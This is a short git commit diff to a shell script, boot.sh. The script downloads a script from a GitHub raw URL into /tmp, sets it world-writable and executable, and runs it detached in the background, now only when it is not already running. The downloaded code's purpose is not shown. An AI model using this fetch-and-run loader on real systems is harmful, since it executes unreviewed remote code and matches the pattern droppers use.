80bb31e213bf3c2299c479a6120e89a4c284e0a8
wulimama001 <wulimama001@gmail.com>
2017-04-18 20:57:33 +0800

    Update boot.sh

--- boot.sh
+++ boot.sh
@@ -1,10 +1,18 @@
 #!/bin/sh
 
- 
-FILE_NAME="/tmp/asdfasdf.sh"
+FILE_NAME="/tmp/asdfasdf44.sh"
+  
+procNum=`ps -ef | grep "$FILE_NAME" | grep -v grep | wc -l`
+
+echo $procNum
+
+if [ $procNum -eq 0 ]; then
+
 /bin/curl https://raw.githubusercontent.com/wulimama001/test/master/test.sh -o $FILE_NAME
+
 
 chmod 777 $FILE_NAME
 
-
 /usr/bin/nohup  /bin/bash $FILE_NAME > "$FILE_NAME.log" 2>&1 &
+
+fi
